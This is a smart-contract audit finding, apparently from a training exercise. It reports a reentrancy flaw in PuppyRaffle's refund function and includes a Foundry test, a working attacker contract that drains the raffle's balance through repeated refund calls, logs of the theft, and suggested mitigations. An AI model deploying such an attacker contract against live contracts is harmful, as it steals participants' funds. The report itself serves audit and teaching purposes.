**[H-1] The function `PuppyRaffle::refund()` is a potential `Reentrancy Attack` threat.**

**Description:**
The function `PuppyRaffle::refund()` refunds a player if he wishes to withdraw from the raffle before it begins by taking the index number of the player as a parameter. If an attacker creates a malicious smart contract that is able to deposit some ETH to the contract and then withdraw all of it by repeatedly calling the refund function through the malicious smart contract.

```diff
Logs:
+ Starting Attacker Contract Balance:  0
+ Starting Contract Balance:  4000000000000000000
- Ending Attacker Contract Balance:  5000000000000000000
- Ending Contract Balance:  0
```

**Impact:**
An attacker can easily create a malicious smart contract capable of repeatedly calling the refund function after depositing some ETH in it. This can lead to the theft of the funds deposited by the participants of the Raffle.

**Proof of code:**
If we write the following the code in the exisitng test file:-

```javascript
function test_reentrancyRefund() public{
       address[] memory players = new address[](4);
       players[0] = playerOne;
       players[1] = playerTwo;
       players[2] = playerThree;
       players[3] = playerFour;

       puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

       ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
       address attackUser = makeAddr("attackUser");
       vm.deal(attackUser, 1 ether);

       uint256 startingAttackerContractBalance = address(attackerContract).balance;
       uint256 startingContractBalance = address(puppyRaffle).balance;

       //attacker
       vm.prank(attackUser);
       attackerContract.attack{value: entranceFee}();

       console.log("Starting Attacker Contract Balance: ",startingAttackerContractBalance);
       console.log("Starting Contract Balance: ",startingContractBalance);

       console.log("Ending Attacker Contract Balance: ",address(attackerContract).balance);
       console.log("Ending Contract Balance: ",address(puppyRaffle).balance);

}
```

And create the malicious attacker's contract with the following code:-
```javascript
contract ReentrancyAttacker{
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle){
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory  players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal{
        if(address(puppyRaffle).balance >= entranceFee){
             puppyRaffle.refund(attackerIndex);
        }
    }


    fallback() external payable {
        _stealMoney();        
    }

    receive() external payable {
        _stealMoney();
    }
}
```

We get the following results:

```diff
Logs:
+  Starting Attacker Contract Balance:  0
+  Starting Contract Balance:  4000000000000000000
-  Ending Attacker Contract Balance:  5000000000000000000
-  Ending Contract Balance:  0
```

**Recommended Mitigation:**
1. Consider updating `players[playerIndex] = address(0)` first before refunding the entrance fee.

2. Consider using a `Reentrancy Guard` modifier on the `PuppyRaffle::refund()` function to avoid reentrancy attack.
```javascript
modifier nonReentrant() {
    require(!reentrancyGuard[msg.sender], "Reentrant call");
    reentrancyGuard[msg.sender] = true;
    _;
    reentrancyGuard[msg.sender] = false;
}

```

3. It is also recommended to use OpenZeppelin's Reentrancy Guard by using the following code.
```javascript
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract MyContract is ReentrancyGuard {
    // Your contract code here
}

```
